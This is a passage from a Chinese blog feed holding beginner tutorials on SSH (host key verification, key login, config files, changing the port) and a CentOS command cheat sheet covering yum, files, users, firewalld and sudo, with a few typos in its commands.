算法私钥</span><br><span class="line">-rw-r--r--. 1 root root    590 May 20 14:22 ssh_host_dsa_key.pub            → DSA 算法公钥</span><br><span class="line">-rw-------. 1 root root    963 May 20 14:22 ssh_host_key            → SSH V1 版RSA 算法私钥</span><br><span class="line">-rw-r--r--. 1 root root    627 May 20 14:22 ssh_host_key.pub        → SSH V1 版 RSA 算法公钥</span><br><span class="line">-rw-------. 1 root root   1675 May 20 14:22 ssh_host_rsa_key        → SSH V2 版 RSA 算法私钥</span><br><span class="line">-rw-r--r--. 1 root root    382 May 20 14:22 ssh_host_rsa_key.pub            → SSH V2 版 RSA 算法公钥</span><br></pre></td></tr></table></figure><h2 id="非对称加密协商"><a href="#非对称加密协商" class="headerlink" title="非对称加密协商"></a>非对称加密协商</h2><p>服务端 SSH 服务正常运行后，客户端连接时，进行如下交互： </p><blockquote><p>**1:**客户端向服务端发送连接请求。 </p><p> 客户端通过 SSH 工具连接服务端。相关信息通过明文发送。 </p><p>**2:**服务端返回公钥信息：  根据客户端所使用的服务协议版本及算法设置，返回相应公钥信息。比如，默认情况下，客户端通过 SSH V2 版协议，基于 RSA 算法建立连接，则服务端将 <code>ssh_host_rsa_key.pub </code>文件中的内容返回客户端。相关信息通过明文发送。 </p><p>**3:**客户端对服务端公钥信息进行比对和确认：  客户端接收到服务端公钥信息后，会进行如下比对，并让用户对相关信息进行确认。 </p><li>如果是首次连接服务端，客户端会收到类似如下信息，让用户确认公钥指纹的有效性： </li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">The authenticity of host &#39;192.168.0.1 (192.168.0.1)&#39; can&#39;t be established.</span><br><span class="line">RSA key fingerprint is c2:49:d9:43:74:d5:ed:bc:28:9b:d2:7b:63:94:cf:bc.</span><br><span class="line">Are you sure you want to continue connecting (yes&#x2F;no)?</span><br></pre></td></tr></table></figure><p>如果用户输入 no ，则连接中断并报错（Host key verification failed）。</p><li>如果用户输入 yes，则会将相应的公钥信息，保存到`当前用户家目录`下` .ssh` 目录内的` known_hosts `文件中。 比如 </li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat ~&#x2F;.ssh&#x2F;known_hosts</span><br><span class="line"></span><br><span class="line">IP 明文显示：</span><br><span class="line">192.168.0.1 ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA3sdlboGEgY9buZpkPuygPw0NxAvmxYd0mc3fo2MgP+JqgFC9&#x2F;9ZXOgDXKJrjE2HKBieJZSPKGncIh+zLxTvmykeJQBXv7i1GiUjW+H3VY69Ge3AdGfCd+XF+Cvi1e+j18zhHnjSzvIBoNpT5cBWWNbw7mNHCwTb0sHAVUkWR4Ck&#x2F;LM5&#x2F;rQ09A+m6BLfZJL8CRNGxKTbyINi6o812S+Cy64WqDs1nTpIXp2Bkcpjclb36bFSs9Z&#x2F;tWNuJl7A&#x2F;&#x2F;7HNtxMgFGBnE07Ykvvy8s06DUmkyFy8GcXGBpnfdg9utLodfQLFQnKflCQZ110BpQaCWlWPjU9dc4w3XLJ&#x2F;XQOP4w&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">IP 做了加密处理：</span><br><span class="line">|1|3efXAZ4sNHcUcHamBy4gDriblc8&#x3D;|8idBhLq9aLl2sfh4KswMsk4sPFI&#x3D; ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAwS4DE3hok8RCkxYlTxsexNrNa62e05UGSkoP7ie26DDWjG1Aoc74cCsE4is9p7lEfFUYYlAzeYhPqE&#x2F;yGf5YxRZUOU2IeFI4cEqo8YZr7edVYpgAq2f2J0zMwk1syenD12lmUPkYA4mMB6it3jxXR5k+H0HZh9YA7mRXkiTjlkAMWirBcnUvtKYRv9LRIr3ikUiPy2gfZO291Ae9zuTsWwEtHQxIpiBgk3vwF2gCUFlX9y&#x2F;&#x2F;IsMjdQq5prk7x3BjXhUorqgJO1gt1VHW8Xxx9Oe50YF1hi9DuE6VXwyh4xfHTmauRQybwsYafdA3HxrA2od6x9l19D9EH7xHAjDa5w&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><li>如果服务端因重装系统等因素导致公钥指纹出现变化，则会直接导致连接失败（报错Host key verification failed），则需要删除已保存的条目后再重新连接 </li><li>如果之前已经成功连接，而且公钥指纹对比一致，则会继续下一步操作。  </li><p>**4:**客户端生成临时密钥对：  服务端公钥校验及确认后，客户端会生成一对临时密钥用于客户端加密。该密钥对不会存储到文件，而是记录在内存中。每次连接都会重新生成临时密钥对。 </p><p>**5:**客户端发送公钥信息：  客户端向服务端，发送前述生成的临时密钥对中的公钥信息。相关信息通过明文发送。 </p></blockquote><p>至此，服务端及客户端都拥有对方的公钥和自身的私钥，所以称为<strong>非对称加密。</strong> </p><h2 id="后续数据交互过程"><a href="#后续数据交互过程" class="headerlink" title="后续数据交互过程"></a>后续数据交互过程</h2><p>后续登录校验及正常的数据传输，都会通过双向加密方式进行。相关交互说明如下： </p><blockquote><p>**1:**如果服务端需要发送数据给客户端： </p><p>(1)服务端使用所持有的客户端公钥，对需要传输的数据进行加密，再发送给客户端。 </p><p>(2)客户端收到信息后，使用所持有的自身私钥解密后获取数据。 </p><p>**2:**反之，如果客户端需要发送数据给服务端，也是类似的流程： </p><p>(1)客户端使用所持有的服务端公钥，对需要传输的数据进行加密，再发送给服务端。 </p><p>(2)服务端收到信息后，使用所持有的自身私钥解密后获取数据。 </p></blockquote><h1 id="服务器安装SSH"><a href="#服务器安装SSH" class="headerlink" title="服务器安装SSH"></a><center>服务器安装SSH</center></h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安装： yum isntall openssh-server</span><br><span class="line">启动： service sshd start</span><br><span class="line">设置开机运行： chkconfig sshd on</span><br><span class="line">查看进程： ps -ef | grep ssh</span><br></pre></td></tr></table></figure><blockquote><p>centos在安装的时候已经默认将客户端和服务端都安装好，可以你之前安装的过程，或者使用<code>yum install openssh-sclients</code>查看</p></blockquote><h1 id="客户端安装SSH"><a href="#客户端安装SSH" class="headerlink" title="客户端安装SSH"></a><center>客户端安装SSH</center></h1><p>在客户端安装有三种：<code>xshell</code>、<code>putty</code>、<code>secureCRT</code></p><blockquote><p>xshell下载链接： <a href="http://dlsw.baidu.com/sw-search-sp/soft/7b/15201/Xshell_5.0.0.37_setup.1459931786.exe">http://dlsw.baidu.com/sw-search-sp/soft/7b/15201/Xshell_5.0.0.37_setup.1459931786.exe</a></p></blockquote><p>在windows下的xshell中 使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.1.115 # 连接到服务器（用户名 + 账号）</span><br></pre></td></tr></table></figure><p>如果不成功， 我们尝试<code>ping</code>一下其ip地址，看看能不能访问这个ip地址</p><p>回到服务器端，使用<code>ifconfig</code>命令，你可能会发现ip地址变了</p><blockquote><p>解释：重启电脑或者重启虚拟机这个ip地址会发生改变的，因为我们是使用<code>桥接</code>方式的</p></blockquote><h1 id="ssh-config"><a href="#ssh-config" class="headerlink" title="ssh config "></a><center>ssh config </center></h1><blockquote><p>config为了方便我们批量管理多个ssh</p><p>config存放在 <code>~/.ssh/config</code></p><p>config配置语法</p></blockquote><h2 id="SSH-config关键字"><a href="#SSH-config关键字" class="headerlink" title="SSH config关键字"></a>SSH config关键字</h2><table><thead><tr><th align="center">关键字</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">Host</td><td align="center">别名</td></tr><tr><td align="center">HostName</td><td align="center">主机名</td></tr><tr><td align="center">Port</td><td align="center">端口</td></tr><tr><td align="center">User</td><td align="center">用户名</td></tr><tr><td align="center">IdentityFile</td><td align="center">密钥文件路径</td></tr></tbody></table><h2 id="创建一个SSH连接"><a href="#创建一个SSH连接" class="headerlink" title="创建一个SSH连接"></a>创建一个SSH连接</h2><p>在家目录下新建一个文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~&#x2F;.ssh&#x2F;</span><br><span class="line">touch config</span><br><span class="line">vim config</span><br></pre></td></tr></table></figure><p><img src="/2018/05/13/SSH%E5%AD%A6%E4%B9%A0/%E5%9B%BE%E7%89%8734.png"></p><p>写入内容</p><p><img src="/2018/05/13/SSH%E5%AD%A6%E4%B9%A0/%E5%9B%BE%E7%89%8735.png"></p><blockquote><p>此时可以通过<code>Host</code>名称wlk登录，不需要写入ip和端口等等信息了</p></blockquote><p><img src="/2018/05/13/SSH%E5%AD%A6%E4%B9%A0/%E5%9B%BE%E7%89%8736.png"></p><blockquote><p>只需要别名就可以连接成功了</p><p>如果是多个用户我们可以 在写个这样的 内容 host “wuliekun” 后面一样的，那么也可以连接成功</p></blockquote><br><h1 id="SSH安全免密码登录：ssh-key"><a href="#SSH安全免密码登录：ssh-key" class="headerlink" title="SSH安全免密码登录：ssh key"></a><center>SSH安全免密码登录：ssh key</center></h1><blockquote><p>ssh key 使用非对称加密方法生成公钥和私钥</p><p>私钥存放在本地<code>~/.ssh</code>目录</p><p>公钥可以对外公开，放在服务器的<code>~/.ssh/authorized_keys</code></p></blockquote><h2 id="Windows平台生成ssh-key"><a href="#Windows平台生成ssh-key" class="headerlink" title="Windows平台生成ssh key"></a>Windows平台生成ssh key</h2><p>点击<code>xshell</code>菜单栏中<code>工具</code>下的<code>用户秘钥管理者</code></p><p><img src="/2018/05/13/SSH%E5%AD%A6%E4%B9%A0/%E5%9B%BE%E7%89%8737.png"></p><p><img src="/2018/05/13/SSH%E5%AD%A6%E4%B9%A0/%E5%9B%BE%E7%89%8738.png"></p><p><img src="/2018/05/13/SSH%E5%AD%A6%E4%B9%A0/39.png"></p><p><img src="/2018/05/13/SSH%E5%AD%A6%E4%B9%A0/Snipaste_2018-05-13_15-42-20.png"></p><blockquote><p>然后将其保存放在桌面上</p></blockquote><p><img src="/2018/05/13/SSH%E5%AD%A6%E4%B9%A0/40.png"></p><h2 id="Linux平台生成ssh-key"><a href="#Linux平台生成ssh-key" class="headerlink" title="Linux平台生成ssh key"></a>Linux平台生成ssh key</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">ssh-keygen -t dsa</span><br></pre></td></tr></table></figure><p>进入到家目录下的<code>/.ssh</code></p><p><img src="/2018/05/13/SSH%E5%AD%A6%E4%B9%A0/41.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure><p><img src="/2018/05/13/SSH%E5%AD%A6%E4%B9%A0/42.png"></p><p>我们使用<code>ls -al</code>在<code>/.ssh</code>目录下看看有没有新增这些文件</p><p><img src="/2018/05/13/SSH%E5%AD%A6%E4%B9%A0/43.png"></p><h3 id="如何使用秘钥"><a href="#如何使用秘钥" class="headerlink" title="如何使用秘钥"></a>如何使用秘钥</h3><li>新建会话</li><p><img src="/2018/05/13/SSH%E5%AD%A6%E4%B9%A0/44.png"></p><li>用户身份验证</li><p><img src="/2018/05/13/SSH%E5%AD%A6%E4%B9%A0/45.png"></p><li>连接</li><p>发现连接出错</p><p><img src="/2018/05/13/SSH%E5%AD%A6%E4%B9%A0/46.png"></p><blockquote><p>原因：公钥可以对外公开，放在服务器的<code>~/.ssh/authorized_keys</code></p><p>而目录下却没有这个authorized_keys.</p><p>所以需要创建一个</p></blockquote><li>创建authorized_keys</li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch authorized_keys</span><br><span class="line">vim authorized_keys</span><br></pre></td></tr></table></figure><p>将windows下的公钥写入到<code>authorized_keys</code>中</p><p><img src="/2018/05/13/SSH%E5%AD%A6%E4%B9%A0/47.png"></p><p>ok了</p><h1 id="SSH安全端口"><a href="#SSH安全端口" class="headerlink" title="SSH安全端口"></a><center>SSH安全端口</center></h1><blockquote><p>1:<code>端口安全</code>是指尽量避免服务器的远程连接端被不法分子知道，为此而改变默认服务端口号的操作</p><p>2:如何改变ssh服务端口</p><li>修改` /etc/ssh/sshd_config`配置</li></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;ssh&#x2F;sshd-config</span><br></pre></td></tr></table></figure><li>修改文件</li><p><img src="/2018/05/13/SSH%E5%AD%A6%E4%B9%A0/%E5%9B%BE%E7%89%8739.png"></p><li>重新启动服务</li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service sshd restart</span><br></pre></td></tr></table></figure><p><img src="/2018/05/13/SSH%E5%AD%A6%E4%B9%A0/%E5%9B%BE%E7%89%8740.png"></p>]]></content>
      
      
      <categories>
          
          <category> CentOS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> SSH </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>须知道的服务器Linux知识</title>
      <link href="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/"/>
      <url>/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a><center>SSH</center></h1><a id="more"></a><table><thead><tr><th align="center"><center>解释</center></th><th align="center"><center>命令</center></th></tr></thead><tbody><tr><td align="center"><center>安装</center></td><td align="center"><center>yum install openssh-server</center></td></tr><tr><td align="center"><center>启动</center></td><td align="center"><center>service sshd start</center></td></tr><tr><td align="center"><center>开机运行</center></td><td align="center"><center>chkconfig ssd on</center></td></tr><tr><td align="center">客户端软件</td><td align="center">yum install openssh-clients</td></tr></tbody></table><h1 id="yum"><a href="#yum" class="headerlink" title="yum"></a><center>yum</center></h1><p>yum是centos中的安装包管理器</p><table><thead><tr><th align="center">解释解释</th><th align="center">命令</th></tr></thead><tbody><tr><td align="center">安装</td><td align="center">yum install xxx</td></tr><tr><td align="center">卸载</td><td align="center">yum remove xxx</td></tr><tr><td align="center">搜索</td><td align="center">yum search xxx</td></tr><tr><td align="center">列出已安装</td><td align="center">yum list</td></tr><tr><td align="center">软件包信息</td><td align="center">yum info xxx</td></tr><tr><td align="center">清理缓存</td><td align="center">yum clean</td></tr></tbody></table><h1 id="硬件"><a href="#硬件" class="headerlink" title="硬件"></a><center>硬件</center></h1><table><thead><tr><th>解释</th><th>命令</th></tr></thead><tbody><tr><td>内存</td><td>free -m</td></tr><tr><td>硬盘</td><td>df -h</td></tr><tr><td>负载</td><td>w/top</td></tr><tr><td>cpu个数和核数</td><td>cat/proc/cpuinfo</td></tr><tr><td>格式化磁盘</td><td>fdisk</td></tr></tbody></table><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%873.png"></p><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%874.png"></p><br><h1 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h1><table><thead><tr><th align="center">命令</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">tail</td><td align="center">从文件尾部开始读</td></tr><tr><td align="center">head</td><td align="center">从文件头部读</td></tr><tr><td align="center">pwd</td><td align="center">显示路径</td></tr><tr><td align="center">cat</td><td align="center">读取整个文件（注意 cat读取整个文件到内存中去，如何是文件比较大，如3G，那么就崩溃了， 所以读取之前要查看一下它的大小）-h</td></tr><tr><td align="center">more</td><td align="center">分页读取</td></tr><tr><td align="center">less</td><td align="center">可控分页</td></tr><tr><td align="center">grep</td><td align="center">搜索关键字</td></tr><tr><td align="center">find</td><td align="center">查找文件</td></tr><tr><td align="center">wc</td><td align="center">统计个数</td></tr></tbody></table><table><thead><tr><th align="center">命令</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">touch</td><td align="center">新建文件</td></tr><tr><td align="center">mkdir</td><td align="center">新建文件夹</td></tr><tr><td align="center">cp</td><td align="center">复制</td></tr><tr><td align="center">rm</td><td align="center">删除文件和目录</td></tr><tr><td align="center">mv</td><td align="center">移动</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find . -type f  (文件）</span><br><span class="line"></span><br><span class="line">find . -type d (目录）</span><br></pre></td></tr></table></figure><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%875.png"></p><h1 id="系统用户操作"><a href="#系统用户操作" class="headerlink" title="系统用户操作"></a><center>系统用户操作</center></h1><table><thead><tr><th align="center">命令</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">useradd</td><td align="center">添加用户</td></tr><tr><td align="center">adduser</td><td align="center">添加用户</td></tr><tr><td align="center">userdel</td><td align="center">删除用户</td></tr><tr><td align="center">passwd</td><td align="center">密码设置</td></tr></tbody></table><h1 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a><center>防火墙</center></h1><h2 id="前奏"><a href="#前奏" class="headerlink" title="前奏"></a>前奏</h2><p> <strong><li>作用:保护服务器安全</li></strong></p><table><thead><tr><th>解释</th><th>命令</th></tr></thead><tbody><tr><td>安装</td><td>yum install firewalld</td></tr><tr><td>启动</td><td>service firewalld start</td></tr><tr><td>检查状态</td><td>service firewalld status</td></tr><tr><td>关闭或者禁闭</td><td>service firewalld stop/disable</td></tr></tbody></table><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%876.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service firewalld status # 查看状态</span><br></pre></td></tr></table></figure><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%877.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --version</span><br><span class="line">firewall-cmd --help</span><br><span class="line">firewall-cmd --state</span><br></pre></td></tr></table></figure><p><strong><li>区域和端口分解</li></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --get-zones</span><br></pre></td></tr></table></figure><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%878.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --list-all-zone</span><br></pre></td></tr></table></figure><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%879.png"></p><p>**<li>查找某一个区域</li></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone&#x3D;public   查找public区域</span><br></pre></td></tr></table></figure><p><strong><li>查看端口号</li></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --list-ports  </span><br></pre></td></tr></table></figure><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%8710.png"></p><p><strong><li>查找某一个服务</li></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --query-service&#x3D;&#x3D;ssh  </span><br></pre></td></tr></table></figure><p>**<li>移除某一个服务</li></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --remove-service&#x3D;&#x3D;ssh</span><br></pre></td></tr></table></figure><p><strong><li>添加某一个服务</li></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --add-service&#x3D;&#x3D;ssh</span><br></pre></td></tr></table></figure><blockquote><p>如果这里移除了ssh服务，那么就无法连接ssh</p><p>通过添加ssh服务有可以重新连接ssh</p></blockquote><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%8711.png"></p><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%8712.png"></p><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%8713.png"></p><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%8714.png"></p><p><strong><li>查看有哪些服务</li></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --list-services</span><br></pre></td></tr></table></figure><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%8715.png"></p><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%8716.png"></p><p><strong><li>添加端口号</li></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --add-port&#x3D;22&#x2F;tcp</span><br></pre></td></tr></table></figure><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%8717.png"></p><blockquote><p>firewall-cmd –get-all-zones  就会看到新添加的端口号来了</p></blockquote><p>（服务和端口添加其中一个就可以了，一般服务方便一些）</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="配置firewalld-cmd"><a href="#配置firewalld-cmd" class="headerlink" title="配置firewalld-cmd"></a>配置firewalld-cmd</h3><table><thead><tr><th align="center">解释</th><th align="center">命令</th></tr></thead><tbody><tr><td align="center">查看版本</td><td align="center">firewall-cmd –version</td></tr><tr><td align="center">查看帮助</td><td align="center">firewall-cmd –help</td></tr><tr><td align="center">显示状态</td><td align="center">firewall-cmd –state</td></tr><tr><td align="center">列出所有状态</td><td align="center">firewall-cmd –get-zones</td></tr><tr><td align="center">列出默认区域</td><td align="center">firewall-cmd –get-default-zone</td></tr><tr><td align="center">列出所有区域配置</td><td align="center">firewall-cmd –list-all-zone</td></tr><tr><td align="center">查看所有打开的端口</td><td align="center">firewall-cmd –zone=public –list-ports</td></tr></tbody></table><table><thead><tr><th align="center">查看规则</th><th align="center">iptables -L -n</th></tr></thead><tbody><tr><td align="center">更新防火墙规则</td><td align="center">firewall-cmd –reload</td></tr><tr><td align="center">查看区域信息</td><td align="center">firewall-cmd –get-active-zones</td></tr><tr><td align="center">查看指定接口所属区域</td><td align="center">firewall-cmd –get-zone-of-interface=eth0</td></tr></tbody></table><h3 id="添加服务"><a href="#添加服务" class="headerlink" title="添加服务"></a>添加服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd –add-service&#x3D;ssh</span><br><span class="line">firewall-cmd –query-service&#x3D;ssh</span><br><span class="line">firewall-cmd –remove-service&#x3D;ssh</span><br></pre></td></tr></table></figure><h3 id="开启端口"><a href="#开启端口" class="headerlink" title="开启端口"></a>开启端口</h3><table><thead><tr><th>添加</th><th>firewall-cmd –zone=public –add-port=80/tcp</th></tr></thead><tbody><tr><td>重新载入</td><td>firewall-cmd –reload</td></tr><tr><td>查看</td><td>firewall-cmd –zone=public –query-port=80/tcp</td></tr><tr><td>删除/html&gt;</td><td>firewall-cmd –zone=public –remove-port=80/tcp</td></tr></tbody></table><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a><center>提权</center></h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo</span><br><span class="line">visudo</span><br></pre></td></tr></table></figure><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%8718.png"></p><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%8719.png"></p><blockquote><p><strong>解决办法：</strong>使用<code>visudo</code>  使用大写的<code>G</code>跑到文件的底部</p><p>​    进行提权操作</p></blockquote><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%8720.png"></p><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%8721.png"></p><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%8722.png"></p><blockquote><p>问题解决</p></blockquote><h1 id="上传和下载"><a href="#上传和下载" class="headerlink" title="上传和下载"></a><li>上传和下载</li></h1><h2 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget</span><br><span class="line">curl</span><br></pre></td></tr></table></figure><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%8723.png"></p><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%8724.png"></p><p>打开下载的文件，我们来查看一下</p><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%8725.png"></p><h2 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h2><h3 id="Linux下的操作"><a href="#Linux下的操作" class="headerlink" title="Linux下的操作"></a>Linux下的操作</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp</span><br></pre></td></tr></table></figure><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%8726.png"></p><h3 id="windows下"><a href="#windows下" class="headerlink" title="windows下"></a>windows下</h3><p>需要安装一个<code>lrzsz  </code>,中间会使用<code>rz</code>和<code>sz</code>两个命令</p><p><strong><li>安装lrzsz</li></strong></p><p><img 